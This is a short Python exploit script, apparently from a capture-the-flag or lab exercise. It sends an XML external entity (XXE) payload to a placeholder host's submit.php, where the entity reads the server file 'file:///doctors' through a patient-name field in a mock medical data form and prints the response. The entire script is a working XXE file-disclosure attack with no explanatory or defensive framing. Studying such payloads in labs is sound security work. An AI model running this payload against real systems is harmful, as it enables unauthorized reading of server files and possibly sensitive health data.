import requests

url = 'http://<host:port>/submit.php'
xml_data = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///doctors"> ]>
<people>
    <patients>
        <patient>
            <name>&xxe;</name>
            <age>33</age>
        </patient>
        <patient>
            <name>john doe</name>
            <age>33</age>
        </patient>
    </patients>
</people>'''

form_data = {
        'data' : xml_data
    }

headers = {
    'Medical-Service': 'Data Entry Agent'
}

response = requests.post(url, data=form_data, headers=headers)

print(f'Status Code: {response.status_code}')
print(f'Response Content: {response.text}')
